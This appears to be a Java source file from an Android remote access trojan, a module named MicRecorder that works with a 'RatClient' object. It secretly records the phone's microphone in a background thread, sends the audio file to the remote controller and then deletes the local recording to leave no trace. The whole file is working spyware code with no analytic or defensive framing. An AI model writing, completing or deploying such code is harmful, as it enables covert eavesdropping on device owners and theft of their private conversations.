package com.syshelper.service;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import java.io.File;
import java.io.FileInputStream;

public class MicRecorder {
    private final Context ctx;
    private final RatClient client;

    public MicRecorder(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    public void record(int durationSec) {
        if (ctx.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            client.sendResult("mic", "no mic permission");
            return;
        }
        new Thread(() -> {
            File outFile = new File(ctx.getFilesDir(), "mic_" + System.currentTimeMillis() + ".m4a");
            try {
                MediaRecorder rec = new MediaRecorder();
                rec.setAudioSource(MediaRecorder.AudioSource.MIC);
                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                rec.setAudioSamplingRate(44100);
                rec.setOutputFile(outFile.getAbsolutePath());
                rec.prepare(); rec.start();
                Thread.sleep(durationSec * 1000L);
                rec.stop(); rec.release();
                byte[] data = new byte[(int) outFile.length()];
                FileInputStream fis = new FileInputStream(outFile);
                fis.read(data); fis.close();
                client.sendFile(outFile.getName(), data, "audio");
                outFile.delete();
            } catch (Exception e) {
                client.sendResult("mic", "Error: " + e.getMessage());
                if (outFile.exists()) outFile.delete();
            }
        }).start();
    }
}
